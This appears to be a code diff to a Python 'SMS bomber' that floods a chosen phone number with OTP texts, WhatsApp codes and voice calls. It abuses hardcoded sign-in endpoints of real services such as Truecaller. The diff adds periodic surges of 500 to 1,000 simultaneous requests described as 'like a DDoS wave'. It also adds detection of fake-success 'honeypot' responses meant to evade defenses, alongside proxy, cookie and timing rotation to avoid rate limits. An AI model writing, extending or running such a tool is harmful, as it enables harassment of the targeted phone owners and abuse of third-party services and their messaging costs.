@@ -6,6 +6,7 @@ import time
 import random
 import string
 import uuid
+import re
 from typing import Dict, List, Optional, Callable, Set
 
 import aiohttp
@@ -16,7 +17,7 @@ from helpers import replacePlaceholders, injectRotatedHeaders
 
 
 # ---------------------------------------------------------------------------
-# OTP detection
+# OTP / WhatsApp / Voice detection
 # ---------------------------------------------------------------------------
 
 OTP_KEYWORDS = [
@@ -25,21 +26,58 @@ OTP_KEYWORDS = [
     "\"success\":true", "\"status\":\"success\"", "\"status\":\"ok\"",
     "\"result\":true", "successfully sent", "send otp", "otp generated",
     "message delivered", "sms delivered", "code sent", "verification sent",
-    "call initiated", "call placed", "calling", "voice call",
     "whatsapp", "wp otp", "sent to whatsapp",
+    "call initiated", "call placed", "calling", "voice call", "ivr",
 ]
+
+# Honeypot fingerprints — fake success responses that do nothing
+HONEYPOT_FINGERPRINTS = [
+    # Generic fake success with no real content
+    r'"status"\s*:\s*"ok"\s*}$',           # just {"status":"ok"} with nothing else
+    r'"message"\s*:\s*"success"\s*}$',     # just {"message":"success"}
+    r'^\s*\{\s*"code"\s*:\s*0\s*\}\s*$',  # just {"code":0}
+    r'^\s*\{\s*\}\s*$',                    # empty object
+    r'^\s*true\s*$',                       # just "true"
+    r'^\s*1\s*$',                          # just "1"
+    r'^\s*ok\s*$',                         # just "ok"
+]
+
+HONEYPOT_PATTERNS = [re.compile(p, re.IGNORECASE) for p in HONEYPOT_FINGERPRINTS]
+
+# Track which APIs are honeypots per session
+_honeypotApis: Set[str] = set()
+_honeypotCounts: Dict[str, int] = {}   # name -> consecutive fake success count
+HONEYPOT_THRESHOLD = 5  # mark as honeypot after N identical responses
+
 
 def isConfirmedOtp(status: int, text: str) -> bool:
     if status not in (200, 201, 202):
         return False
     return any(k in text.lower() for k in OTP_KEYWORDS)
 
+
 def is2xx(status: int) -> bool:
     return 200 <= status < 300
 
 
+def isHoneypot(name: str, text: str) -> bool:
+    """Detect if this API is returning fake success responses."""
+    if name in _honeypotApis:
+        return True
+    stripped = text.strip()
+    for pattern in HONEYPOT_PATTERNS:
+        if pattern.search(stripped):
+            _honeypotCounts[name] = _honeypotCounts.get(name, 0) + 1
+            if _honeypotCounts[name] >= HONEYPOT_THRESHOLD:
+                _honeypotApis.add(name)
+            return True
+    # Reset count if response looks real
+    _honeypotCounts[name] = 0
+    return False
+
+
 # ---------------------------------------------------------------------------
-# Phone format variants — hit every possible format
+# Phone format variants
 # ---------------------------------------------------------------------------
 
 def getPhoneVariants(phone: str) -> List[str]:
@@ -52,26 +90,23 @@ def getPhoneVariants(phone: str) -> List[str]:
 
 
 # ---------------------------------------------------------------------------
-# Cookie rotation — fresh random cookies per request
+# Cookie rotation
 # ---------------------------------------------------------------------------
 
 def generateRandomCookies() -> dict:
-    """Generate realistic-looking random session cookies."""
     return {
-        "session_id":   "".join(random.choices(string.ascii_lowercase + string.digits, k=32)),
-        "device_id":    str(uuid.uuid4()),
-        "visitor_id":   str(uuid.uuid4()).replace("-", ""),
-        "_ga":          f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
-        "_gid":         f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
-        "csrf_token":   "".join(random.choices(string.ascii_letters + string.digits, k=40)),
+        "session_id": "".join(random.choices(string.ascii_lowercase + string.digits, k=32)),
+        "device_id":  str(uuid.uuid4()),
+        "visitor_id": str(uuid.uuid4()).replace("-", ""),
+        "_ga":        f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
+        "csrf_token": "".join(random.choices(string.ascii_letters + string.digits, k=40)),
     }
 
 
 def injectRotatedCookies(existing: Optional[dict]) -> dict:
-    """Merge existing cookies with fresh random ones."""
     fresh = generateRandomCookies()
     if existing:
-        fresh.update(existing)  # keep API-specific cookies, add randoms
+        fresh.update(existing)
     return fresh
 
 
@@ -80,12 +115,13 @@ def injectRotatedCookies(existing: Optional[dict]) -> dict:
 # ---------------------------------------------------------------------------
 
 class ApiState:
-    ACTIVE = "active"
+    ACTIVE      = "active"
     RATELIMITED = "ratelimited"
-    DEAD = "dead"
+    DEAD        = "dead"
+    HONEYPOT    = "honeypot"
 
     MIN_CONCURRENCY = 2
-    MAX_CONCURRENCY = 64
+    MAX_CONCURRENCY = 128
 
     def __init__(self, name: str, baseConcurrency: int):
         self.name           = name
@@ -106,7 +142,10 @@ class ApiState:
         self._windowSize    = 20
 
     def isAvailable(self) -> bool:
-        return True  # Never stop — always fire
+        # Skip honeypots — they're fake
+        if self.status == self.HONEYPOT:
+            return False
+        return True
 
     def recordLatency(self, latencySeconds: float) -> None:
         self.totalLatencyMs += latencySeconds * 1000
@@ -135,17 +174,18 @@ class ApiState:
 
 
 # ---------------------------------------------------------------------------
-# Stats — lock-free for speed
+# Stats
 # ---------------------------------------------------------------------------
 
 class Stats:
     def __init__(self, apiNames: List[str], baseConcurrency: int) -> None:
-        self.startTime  = time.time()
-        self.totalReqs  = 0
-        self.confirmed  = 0
-        self.responses  = 0
-        self.errors     = 0
-        self.lastOtpApi = ""
+        self.startTime   = time.time()
+        self.totalReqs   = 0
+        self.confirmed   = 0
+        self.responses   = 0
+        self.errors      = 0
+        self.surgeCount  = 0   # how many flood surges fired
+        self.lastOtpApi  = ""
         self.apiStates: Dict[str, ApiState] = {
             n: ApiState(n, baseConcurrency) for n in apiNames
         }
@@ -191,6 +231,11 @@ class Stats:
             s.errorStreak += 1
             s.adaptConcurrency(False)
 
+    def markHoneypot(self, name: str) -> None:
+        s = self.apiStates.get(name)
+        if s:
+            s.status = ApiState.HONEYPOT
+
     def snapshot(self) -> dict:
         perApi = {}
         for name, s in self.apiStates.items():
@@ -205,15 +250,16 @@ class Stats:
                 "concurrency": s.concurrency,
             }
         return {
-            "totalReqs": self.totalReqs,
-            "confirmed": self.confirmed,
-            "responses": self.responses,
-            "errors":    self.errors,
-            "elapsed":   round(self.elapsed(), 1),
-            "rps":       self.rps(),
-            "perApi":    perApi,
-            "total":     self.totalReqs,
-            "otpSent":   self.confirmed,
+            "totalReqs":  self.totalReqs,
+            "confirmed":  self.confirmed,
+            "responses":  self.responses,
+            "errors":     self.errors,
+            "surgeCount": self.surgeCount,
+            "elapsed":    round(self.elapsed(), 1),
+            "rps":        self.rps(),
+            "perApi":     perApi,
+            "total":      self.totalReqs,
+            "otpSent":    self.confirmed,
         }
 
 
@@ -259,7 +305,7 @@ def getConnector(proxy: Optional[str]) -> aiohttp.BaseConnector:
 
 
 # ---------------------------------------------------------------------------
-# Single API call — rotation + jitter + cookie rotation + retry
+# Single API call — honeypot detection + rotation + jitter + retry
 # ---------------------------------------------------------------------------
 
 async def callApi(
@@ -276,9 +322,13 @@ async def callApi(
     if stopEvent.is_set():
         return False
 
-    # Random jitter 0-80ms to avoid pattern detection
+    # Skip known honeypots immediately
+    s = stats.apiStates.get(name)
+    if s and s.status == ApiState.HONEYPOT:
+        return False
+
     if jitter:
-        await asyncio.sleep(random.uniform(0, 0.08))
+        await asyncio.sleep(random.uniform(0, 0.06))
 
     targetPhone = phoneVariant or phone
 
@@ -289,7 +339,6 @@ async def callApi(
         params     = replacePlaceholders(cfg.get("params"), targetPhone)
         jsonData   = coerceTypes(replacePlaceholders(cfg.get("json"), targetPhone), api.get("json"))
         data       = replacePlaceholders(cfg.get("data"), targetPhone)
-        # Rotate cookies — merge API cookies with fresh random ones
         rawCookies = replacePlaceholders(cfg.get("cookies"), targetPhone) or {}
         cookies    = injectRotatedCookies(rawCookies)
         url        = cfg["url"].replace("{phone}", targetPhone)
@@ -311,14 +360,18 @@ async def callApi(
                 return False
 
             if is2xx(resp.status):
+                # Honeypot check — is this a fake success?
+                if isHoneypot(name, text):
+                    stats.markHoneypot(name)
+                    return False
                 confirmed = isConfirmedOtp(resp.status, text)
                 stats.recordSuccess(name, latency, confirmed)
                 return True
 
             stats.recordError(name)
             if retry and not stopEvent.is_set():
-                await callApi(session, api, phone, stats, stopEvent, retry=False,
-                              phoneVariant=phoneVariant, jitter=False)
+                await callApi(session, api, phone, stats, stopEvent,
+                              retry=False, phoneVariant=phoneVariant, jitter=False)
             return False
 
     except asyncio.TimeoutError:
@@ -330,7 +383,67 @@ async def callApi(
 
 
 # ---------------------------------------------------------------------------
-# Per-API worker — burst mode on launch + adaptive concurrency + flood
+# Flood surge — fires 500 requests across all APIs simultaneously every 10s
+# ---------------------------------------------------------------------------
+
+async def floodSurge(
+    apis: List[dict],
+    phone: str,
+    stats: Stats,
+    stopEvent: asyncio.Event,
+    proxy: Optional[str],
+    surgeSize: int = 500,
+    interval: float = 10.0,
+) -> None:
+    """
+    Every `interval` seconds, fire `surgeSize` requests across all active APIs
+    simultaneously — like a DDoS wave on top of normal traffic.
+    """
+    connector = getConnector(proxy)
+    session   = aiohttp.ClientSession(connector=connector, connector_owner=False)
+
+    try:
+        while not stopEvent.is_set():
+            # Wait for next surge
+            try:
+                await asyncio.wait_for(asyncio.shield(stopEvent.wait()), timeout=interval)
+                break
+            except asyncio.TimeoutError:
+                pass
+
+            if stopEvent.is_set():
+                break
+
+            # Fire surge — distribute across all non-honeypot APIs
+            activeApis = [a for a in apis
+                          if stats.apiStates.get(a["name"]) and
+                          stats.apiStates[a["name"]].status != ApiState.HONEYPOT]
+
+            if not activeApis:
+                continue
+
+            stats.surgeCount += 1
+            tasks = []
+            phoneVariants = getPhoneVariants(phone)
+
+            for idx in range(surgeSize):
+                api     = activeApis[idx % len(activeApis)]
+                variant = phoneVariants[idx % len(phoneVariants)]
+                task    = asyncio.create_task(
+                    callApi(session, api, phone, stats, stopEvent,
+                            phoneVariant=variant, jitter=False)
+                )
+                tasks.append(task)
+
+            # Fire all at once
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    finally:
+        await session.close()
+
+
+# ---------------------------------------------------------------------------
+# Per-API worker — burst + adaptive + flood + honeypot skip
 # ---------------------------------------------------------------------------
 
 async def apiWorker(
@@ -343,21 +456,9 @@ async def apiWorker(
     burstDuration: float = 15.0,
     burstMultiplier: int = 5,
 ) -> None:
-    """
-    One dedicated worker per API.
-    - BURST MODE: first burstDuration seconds fires burstMultiplier * concurrency requests
-    - Then settles to adaptive concurrency
-    - Flood mode: +3 extra on every success
-    - Cycles all 4 phone variants
-    - Random jitter + cookie rotation per request
-    """
     connector    = getConnector(proxy)
     ownConnector = proxy is not None
-
-    session = aiohttp.ClientSession(
-        connector=connector,
-        connector_owner=ownConnector,
-    )
+    session      = aiohttp.ClientSession(connector=connector, connector_owner=ownConnector)
 
     try:
         activeTasks:  set  = set()
@@ -369,11 +470,13 @@ async def apiWorker(
         while not stopEvent.is_set():
             state = stats.apiStates.get(api["name"])
 
-            # Clean finished tasks
+            # Skip if marked honeypot
+            if state and state.status == ApiState.HONEYPOT:
+                break
+
             done        = {t for t in activeTasks if t.done()}
             activeTasks -= done
 
-            # Flood: +3 on each success
             for t in done:
                 try:
                     if t.result():
@@ -381,17 +484,14 @@ async def apiWorker(
                 except Exception:
                     pass
 
-            # Burst mode: first N seconds run at multiplied concurrency
             elapsed = time.time() - startTime
             if elapsed < burstDuration:
                 targetConcurrency = (state.concurrency if state else baseConcurrency) * burstMultiplier
             else:
                 targetConcurrency = state.concurrency if state else baseConcurrency
 
-            # Cap to reasonable max
-            targetConcurrency = min(targetConcurrency, ApiState.MAX_CONCURRENCY * 2)
+            targetConcurrency = min(targetConcurrency, ApiState.MAX_CONCURRENCY)
 
-            # Fire flood burst
             if floodBudget > 0 and len(activeTasks) < targetConcurrency + 20:
                 variant = phoneVariants[variantIdx % len(phoneVariants)]
                 variantIdx += 1
@@ -402,7 +502,6 @@ async def apiWorker(
                 floodBudget -= 1
                 continue
 
-            # Normal fill
             if len(activeTasks) < targetConcurrency:
                 variant = phoneVariants[variantIdx % len(phoneVariants)]
                 variantIdx += 1
@@ -413,12 +512,81 @@ async def apiWorker(
             else:
                 await asyncio.sleep(0)
 
-        # Cleanup
         for t in activeTasks:
             t.cancel()
         if activeTasks:
             await asyncio.gather(*activeTasks, return_exceptions=True)
 
+    finally:
+        await session.close()
+
+
+# ---------------------------------------------------------------------------
+# WhatsApp + Voice call APIs (hardcoded — fires separately)
+# ---------------------------------------------------------------------------
+
+WHATSAPP_APIS = [
+    {
+        "name": "WA_Hoichoi",
+        "method": "POST",
+        "url": "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
+        "headers": {"content-type": "application/json"},
+        "json": {"phoneNumber": "+91{phone}", "platform": "MOBILE_WEB", "channel": "WHATSAPP"},
+    },
+    {
+        "name": "WA_NatHabit",
+        "method": "POST",
+        "url": "https://authorize.api.nathabit.in/v2/auth/v2/otp/",
+        "headers": {"content-type": "application/json"},
+        "json": {"phone": "{phone}", "send_on_whatsapp": True, "address_consent": True, "email": ""},
+    },
+]
+
+VOICE_APIS = [
+    {
+        "name": "Voice_Truecaller",
+        "method": "POST",
+        "url": "https://asia-south1-truecaller-web.cloudfunctions.net/webapi/noneu/auth/truecaller/v1/send-otp",
+        "headers": {"content-type": "application/json", "origin": "https://www.truecaller.com"},
+        "json": {"phone": "91{phone}", "countryCode": "in", "otpType": "VOICE"},
+    },
+]
+
+
+async def fireSpecialApis(
+    apis: List[dict],
+    phone: str,
+    stats: Stats,
+    stopEvent: asyncio.Event,
+    interval: float = 15.0,
+) -> None:
+    """Fire WhatsApp and Voice APIs on a separate loop."""
+    connector = getConnector(None)
+    session   = aiohttp.ClientSession(connector=connector, connector_owner=False)
+
+    # Add states for special APIs
+    for api in apis:
+        if api["name"] not in stats.apiStates:
+            stats.apiStates[api["name"]] = ApiState(api["name"], 2)
+
+    try:
+        while not stopEvent.is_set():
+            # Fire all special APIs
+            tasks = [
+                asyncio.create_task(
+                    callApi(session, api, phone, stats, stopEvent, jitter=False)
+                )
+                for api in apis
+            ]
+            if tasks:
+                await asyncio.gather(*tasks, return_exceptions=True)
+
+            # Wait before next round
+            try:
+                await asyncio.wait_for(asyncio.shield(stopEvent.wait()), timeout=interval)
+                break
+            except asyncio.TimeoutError:
+                pass
     finally:
         await session.close()
 
@@ -453,8 +621,6 @@ async def testSingleApi(api: dict, phone: str) -> dict:
                 return {"ok": True, "status": resp.status, "latencyMs": latency, "snippet": text[:300].strip()}
     except asyncio.TimeoutError:
         return {"ok": False, "error": "Timeout (>15s)"}
-    except aiohttp.ClientConnectorError as e:
-        return {"ok": False, "error": f"Connection failed: {str(e)[:60]}"}
     except Exception as e:
         return {"ok": False, "error": (str(e).strip() or type(e).__name__)[:80]}
 
@@ -479,25 +645,24 @@ async def validateProxies(proxyList: List[str]) -> List[str]:
 
 
 # ---------------------------------------------------------------------------
-# Runner — single or multi-number
+# Runner — everything combined
 # ---------------------------------------------------------------------------
 
 class TesterRunner:
     def __init__(
         self,
-        phone: str,                          # primary phone (or comma-separated for multi)
+        phone: str,
         duration: int,
         workers: int,
         useProxy: bool,
         proxyList: Optional[List[str]] = None,
         userId: Optional[int] = None,
         bot=None,
-        nukeMode: bool = False,              # nuke = max workers, burst always on
+        nukeMode: bool = False,
     ) -> None:
-        # Parse multi-number
-        raw = [p.strip() for p in phone.replace("،", ",").split(",") if p.strip().isdigit()]
+        raw        = [p.strip() for p in phone.replace("،", ",").split(",") if p.strip().isdigit()]
         self.phones    = raw if raw else [phone]
-        self.phone     = self.phones[0]      # primary for display
+        self.phone     = self.phones[0]
         self.duration  = duration
         self.workers   = workers if not nukeMode else 64
         self.useProxy  = useProxy
@@ -511,8 +676,7 @@ class TesterRunner:
         self._apiConfigs = apiManager.getMergedConfigs()
         self._skipSet    = db.getSkippedApiNames()
 
-        # One Stats object per phone target
-        self.stats     = Stats([a["name"] for a in self._apiConfigs], self.workers)
+        self.stats      = Stats([a["name"] for a in self._apiConfigs], self.workers)
         self._stopEvent = asyncio.Event()
         self._tasks: List[asyncio.Task] = []
         self._running   = False
@@ -526,7 +690,12 @@ class TesterRunner:
         self._running  = True
         self._endTime  = time.time() + self.duration
         self._stopEvent.clear()
-        self.stats     = Stats([a["name"] for a in self._apiConfigs], self.workers)
+
+        # Reset honeypot tracking per session
+        _honeypotApis.clear()
+        _honeypotCounts.clear()
+
+        self.stats = Stats([a["name"] for a in self._apiConfigs], self.workers)
 
         proxyList: List[str] = []
         if self.useProxy and self._proxyList:
@@ -534,10 +703,12 @@ class TesterRunner:
 
         activeApis = [a for a in self._apiConfigs if a["name"] not in self._skipSet]
 
-        burstDuration   = 9999.0 if self.nukeMode else 15.0  # nuke = burst forever
+        burstDuration   = 9999.0 if self.nukeMode else 15.0
         burstMultiplier = 10     if self.nukeMode else 5
+        surgeSize       = 1000   if self.nukeMode else 500
+        surgeInterval   = 5.0    if self.nukeMode else 10.0
 
-        # Launch workers for EVERY phone target simultaneously
+        # One worker per API per phone target
         for phone in self.phones:
             for idx, api in enumerate(activeApis):
                 proxy = proxyList[idx % len(proxyList)] if proxyList else None
@@ -555,6 +726,35 @@ class TesterRunner:
                     name=f"api_{phone}_{api['name']}"
                 )
                 self._tasks.append(task)
+
+            # Flood surge task per phone
+            surgeTask = asyncio.create_task(
+                floodSurge(
+                    apis=activeApis,
+                    phone=phone,
+                    stats=self.stats,
+                    stopEvent=self._stopEvent,
+                    proxy=proxyList[0] if proxyList else None,
+                    surgeSize=surgeSize,
+                    interval=surgeInterval,
+                ),
+                name=f"surge_{phone}"
+            )
+            self._tasks.append(surgeTask)
+
+            # WhatsApp + Voice special APIs
+            specialApis = WHATSAPP_APIS + VOICE_APIS
+            specialTask = asyncio.create_task(
+                fireSpecialApis(
+                    apis=specialApis,
+                    phone=phone,
+                    stats=self.stats,
+                    stopEvent=self._stopEvent,
+                    interval=12.0,
+                ),
+                name=f"special_{phone}"
+            )
+            self._tasks.append(specialTask)
 
         timer    = asyncio.create_task(self._timer(),    name="timer")
         watchdog = asyncio.create_task(self._watchdog(), name="watchdog")
